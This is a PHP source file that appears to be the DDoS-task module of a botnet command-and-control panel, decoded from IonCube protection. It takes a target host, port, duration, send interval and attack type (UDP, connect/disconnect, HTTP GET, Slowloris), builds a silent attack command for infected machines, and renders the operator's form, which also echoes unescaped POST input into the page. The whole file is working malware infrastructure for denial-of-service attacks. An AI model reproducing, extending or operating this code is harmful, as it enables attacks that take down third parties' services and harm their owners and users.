<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "\t\t\t\t";
if (!defined("IN_TASKS_MODULE")) {
    exit("..");
}
if (!isset($_TASK_FILE_UI_ONLY)) {
    define("TASKS_DDOS_ERROR_TARGET_REQUIRED", "A target is required to add a DDoS task.");
    define("TASKS_DDOS_ERROR_TARGET_INVALID", "The target you specified was invalid. Please provide a valid URL if HTTP-based flood, or a valid IP/domain name if anything else.");
    define("TASKS_DDOS_ERROR_PORT_REQUIRED", "A target port is required to add a DDoS task.");
    define("TASKS_DDOS_ERROR_PORT_INVALID", "A target port you provided was invalid. Please only use a numeric port between 1 - 65535");
    define("TASKS_DDOS_ERROR_DURATION_REQUIRED", "A duration must be specified to add this task.");
    define("TASKS_DDOS_ERROR_DURATION_INVALID", "The duration length you specified was invalid. Please limit your duration to 1 - 9999 minutes.");
    define("TASKS_DDOS_ERROR_SENDI_REQUIRED", "You must provide some sort of packet send interval. Alternatively, you can use 50 (ms) as default.");
    define("TASKS_DDOS_ERROR_SENDI_INVALID", "The packet send interval you specified was invalid. Please specify an interval between 1 - 99999 milliseconds.");
    define("TASKS_DDOS_ERROR_ATTACK_TYPE_REQUIRED", "Attack type not specified.");
    define("TASKS_DDOS_ERROR_ATTACK_TYPE_INVALID", "Invalid/unrecognized attack type.");
    if (!isset($_POST["cmd_ddos_target"])) {
        $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_TARGET_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
    } else {
        if (!isset($_POST["cmd_ddos_port"]) || strlen($_POST["cmd_ddos_port"]) == 0) {
            $_TASK_FILE_UI_FIELD_ERRORS["field_2"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_PORT_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
        } else {
            if (!isset($_POST["cmd_ddos_duration"]) || strlen($_POST["cmd_ddos_duration"]) == 0) {
                $_TASK_FILE_UI_FIELD_ERRORS["field_3"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_DURATION_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
            } else {
                if (!isset($_POST["cmd_ddos_send_interval"]) || strlen($_POST["cmd_ddos_send_interval"]) == 0) {
                    $_TASK_FILE_UI_FIELD_ERRORS["field_4"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_SENDI_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                } else {
                    if (!isset($_POST["cmd_ddos_type"]) || strlen($_POST["cmd_ddos_type"]) == 0) {
                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_ATTACK_TYPE_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                    } else {
                        $_TASK_COMMAND_FIELDS = array("target" => "", "port" => 0, "duration" => 0, "send_interval" => 0, "type" => "");
                        $_TASK_COMMAND_FIELDS["target"] = $_POST["cmd_ddos_target"];
                        $_TASK_COMMAND_FIELDS["port"] = (int) $_POST["cmd_ddos_port"];
                        $_TASK_COMMAND_FIELDS["duration"] = (int) $_POST["cmd_ddos_duration"];
                        $_TASK_COMMAND_FIELDS["send_interval"] = (int) $_POST["cmd_ddos_send_interval"];
                        $_TASK_COMMAND_FIELDS["type"] = $_POST["cmd_ddos_type"];
                        if (_obfuscated_0D2618320734310426341211042E2D09365B2718072522_($_POST["cmd_ddos_target"]) != true) {
                            if (456 < strlen($_TASK_COMMAND_FIELDS["target"])) {
                                $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_TARGET_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                            } else {
                                if ($_TASK_COMMAND_FIELDS["port"] < 1 && $_TASK_COMMAND_FIELDS["type"] != "udp" || 65535 < $_TASK_COMMAND_FIELDS["port"]) {
                                    $_TASK_FILE_UI_FIELD_ERRORS["field_2"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_PORT_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                } else {
                                    if ($_TASK_COMMAND_FIELDS["duration"] < 1 || 9999 < $_TASK_COMMAND_FIELDS["duration"]) {
                                        $_TASK_FILE_UI_FIELD_ERRORS["field_3"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_DURATION_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                    } else {
                                        if ($_TASK_COMMAND_FIELDS["send_interval"] < 1 || 99999 < $_TASK_COMMAND_FIELDS["send_interval"]) {
                                            $_TASK_FILE_UI_FIELD_ERRORS["field_4"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_SENDI_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                        } else {
                                            if ($_TASK_COMMAND_FIELDS["type"] != "udp" && $_TASK_COMMAND_FIELDS["type"] != "condis" && $_TASK_COMMAND_FIELDS["type"] != "httpget" && $_TASK_COMMAND_FIELDS["type"] != "slowloris" && $_TASK_COMMAND_FIELDS["type"] != "rudy") {
                                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_ATTACK_TYPE_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                            } else {
                                                $num_alphanums = 0;
                                                $target_string = @str_split($_POST["cmd_ddos_target"]);
                                                foreach ($target_string as $ct_element) {
                                                    if ((int) $ct_element < 32 || 200 < (int) $ct_element) {
                                                        $num_alphanums++;
                                                    }
                                                }
                                                if ($num_alphanums < 3) {
                                                    $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_TARGET_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                                } else {
                                                    if (strlen($_POST["cmd_ddos_target"]) < 3) {
                                                        $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                        if (0 < strlen($_POST["cmd_ddos_target"])) {
                                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_TARGET_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                                        } else {
                                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_DDOS_ERROR_TARGET_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                                                        }
                                                    } else {
                                                        $e_cmd_switches = COMMAND_GENERAL_SWITCH_SILENT;
                                                        if (isset($_POST["cmd_ddos_use_random"])) {
                                                            $e_cmd_switches .= COMMAND_DDOS_SWITCH_RANDOM_DATA;
                                                        }
                                                        if (isset($_POST["cmd_ddos_stop"])) {
                                                            $e_cmd_switches .= COMMAND_DDOS_SWITCH_STOP;
                                                        }
                                                        $_TASK_FILE_SQL_TASK_TYPE = TASK_TYPE_DDOS;
                                                        $_TASK_COMMAND_STRING = @sprintf(COMMAND_FORMAT_DDOS, COMMAND_STRING_DDOS, $e_cmd_switches, $_TASK_COMMAND_FIELDS["type"], $_TASK_COMMAND_FIELDS["duration"], $_TASK_COMMAND_FIELDS["send_interval"], $_TASK_COMMAND_FIELDS["port"], $_TASK_COMMAND_FIELDS["target"]);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
} else {
    if (0 < strlen($e_task_cmd_string)) {
        $task_ddos_splits = @explode(" ", $e_task_cmd_string);
        list($task_ddos_edit__switches, $task_ddos_edit__type) = $task_ddos_splits;
        $task_ddos_edit__duration = (int) $task_ddos_splits[3];
        $task_ddos_edit__send_interval = (int) $task_ddos_splits[4];
        $task_ddos_edit__port = (int) $task_ddos_splits[5];
        $task_ddos_edit__target = $task_ddos_splits[6];
    } else {
        $task_ddos_edit__switches = "";
        $task_ddos_edit__type = "udp";
        if (isset($_POST["cmd_ddos_type"]) && 0 < strlen($_POST["cmd_ddos_type"])) {
            $task_ddos_edit__type = $_POST["cmd_ddos_type"];
        }
        $task_ddos_edit__duration = (int) isset($_POST["cmd_ddos_duration"]) ? $_POST["cmd_ddos_duration"] : 5;
        $task_ddos_edit__send_interval = (int) isset($_POST["cmd_ddos_send_interval"]) ? $_POST["cmd_ddos_send_interval"] : 25;
        $task_ddos_edit__port = (int) isset($_POST["cmd_ddos_port"]) ? $_POST["cmd_ddos_port"] : 80;
        $task_ddos_edit__target = isset($_POST["cmd_ddos_target"]) ? $_POST["cmd_ddos_target"] : "127.0.0.1";
    }
    echo "\t\t\t\t";
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("DDoS Command options", 17, "top: 0px; font-size: 10px; face: font-family: Tahoma;", "left: 2px");
    echo "\t\t\t\t<br />\n\t\t\t\t<span style=\"position: relative; top: -1px;\">\n\t\t\t\t<input type=\"hidden\" name=\"cmd_command\" value=\"ddos\">\n\t\t\t\t<table>\n\t\t\t\t\t<tbody>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">Target host: &nbsp;&nbsp;&nbsp;</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_ddos_target\" value=\"";
    echo $task_ddos_edit__target;
    echo "\" style=\"position: relative; top: -1px; width: 320px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
    echo $_TASK_FILE_UI_FIELD_ERRORS["field_1"];
    echo "\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">Target port: &nbsp;&nbsp;&nbsp;</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_ddos_port\" value=\"";
    echo $task_ddos_edit__port;
    echo "\" style=\"position: relative; top: -1px; width: 30px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
    echo $_TASK_FILE_UI_FIELD_ERRORS["field_2"];
    echo "\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">Duration: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_ddos_duration\" value=\"";
    echo $task_ddos_edit__duration;
    echo "\" style=\"position: relative; top: -1px; width: 30px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
    echo $_TASK_FILE_UI_FIELD_ERRORS["field_3"];
    echo "\">\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">&nbsp;&nbsp;<i>(Minutes)</i></span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">Send Interval:&nbsp;</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_ddos_send_interval\" value=\"";
    echo $task_ddos_edit__send_interval;
    echo "\" style=\"position: relative; top: -1px; width: 30px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
    echo $_TASK_FILE_UI_FIELD_ERRORS["field_4"];
    echo "\">\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -5px;\">&nbsp;&nbsp;<i>(In milliseconds)</i></span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -4px;\">Attack type:&nbsp;&nbsp;&nbsp;&nbsp;</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t  <select name=\"cmd_ddos_type\" style=\"position: relative; top: -1px; width: 160px; height: 24px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t  ";
    $tts = $task_ddos_edit__type;
    echo "\t\t\t\t\t\t\t  <option value=\"udp\" ";
    if ($tts == "udp") {
        echo "selected";
    }
    echo ">UDP</option>\n\t\t\t\t\t\t\t  <option value=\"condis\" ";
    if ($tts == "condis") {
        echo "selected";
    }
    echo ">Rapid Connect/Disconnect</option>\n\t\t\t\t\t\t\t  <option value=\"httpget\" ";
    if ($tts == "httpget") {
        echo "selected";
    }
    echo ">HTTP GET</option>\n\t\t\t\t\t\t\t  <option value=\"slowloris\" ";
    if ($tts == "slowloris") {
        echo "selected";
    }
    echo ">Slowloris</option>\n\t\t\t\t\t\t\t  <!--<option value=\"rudy\" ";
    if ($tts == "rudy") {
        echo "selected";
    }
    echo ">R.U.D.Y</option>-->\n\t\t\t\t\t\t\t  </select>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</tbody>\n\t\t\t\t</table>\n\t\t\t\t\n\t\t\t\t\n\t\t\t  ";
    if (strlen($task_ddos_edit__switches)) {
        $ppt_task_option_random_data = strstr($task_ddos_edit__switches, COMMAND_DDOS_SWITCH_RANDOM_DATA) ? "checked" : "";
    } else {
        $ppt_task_option_random_data = isset($_POST["cmd_ddos_use_random"]) ? "checked" : "";
    }
    if (strlen($task_ddos_edit__switches)) {
        $ppt_task_option_cmd_ddos_stop = strstr($task_ddos_edit__switches, COMMAND_DDOS_SWITCH_STOP) ? "checked" : "";
    } else {
        $ppt_task_option_cmd_ddos_stop = isset($_POST["cmd_ddos_stop"]) ? "checked" : "";
    }
    echo "\t\t\t  <span style=\"position: relative; top: 5px;\">\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 270px;\">\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_ddos_use_random\" value=\"yes\" style=\"position: relative; top: -1px\" ";
    echo $ppt_task_option_random_data;
    echo ">\n                Use random data and/or user agents (Attack-specific)\n              </label>\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 270px;\">\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_ddos_stop\" value=\"yes\" style=\"position: relative; top: -1px\" ";
    echo $ppt_task_option_cmd_ddos_stop;
    echo ">\n                Stop current DDoS attack (Above parameters not used)\n              </label>\n\t\t\t  </span>\n\t\t\t  </span>\n\t\t\t  ";
}

?>